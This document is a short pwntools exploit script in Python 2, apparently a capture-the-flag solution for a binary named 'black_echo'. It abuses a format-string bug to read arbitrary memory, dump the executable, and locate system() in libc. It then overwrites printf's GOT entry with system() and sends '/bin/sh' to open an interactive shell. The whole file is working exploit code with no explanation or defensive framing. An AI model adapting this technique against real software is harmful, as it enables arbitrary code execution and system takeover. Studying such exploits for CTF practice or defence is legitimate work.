from pwn import *

buf_off = 7
base_addr = 0x8048000 # The default for 32 bit linux binaries
printf_got = 0x804c010 # Obtained by running leak_elf() and observing the printf plt function

r = process('./black_echo')

# Leak at least one byte from addr
def leak_bytes(addr):
    # fgets() can't read past '\n'
    if '\n' in p32(addr):
        print('warning: ignoring read at ' + hex(addr))
        return '\x00'

    pad_len = 12
    payload = ('%' + str(buf_off + pad_len // 4) + '$sLEKEND\x00').ljust(pad_len) + p32(addr)
    r.sendline(payload)
    leak = r.recvuntil('LEKEND')
    leak = leak.replace('LEKEND', '\x00')
    print hex(addr) + ': ' + repr(leak)
    return leak

# Leak the ELF executable (somewhat corrupted)
def leak_elf():
    elf = ''
    addr = base_addr
    try:
        while True:
            leak = leak_bytes(addr)
            elf += leak
            addr += len(leak)
    except:
        pass
    f = open('leak.elf', 'w')
    f.write(elf)
    f.close()

d = DynELF(leak_bytes, base_addr)
system_addr = d.lookup('system', 'libc')
print 'Leaked system() address: ' + hex(system_addr)
writes = { printf_got: system_addr }
payload = fmtstr_payload(buf_off, writes)
r.sendline(payload)
r.sendline('/bin/sh')
r.interactive()
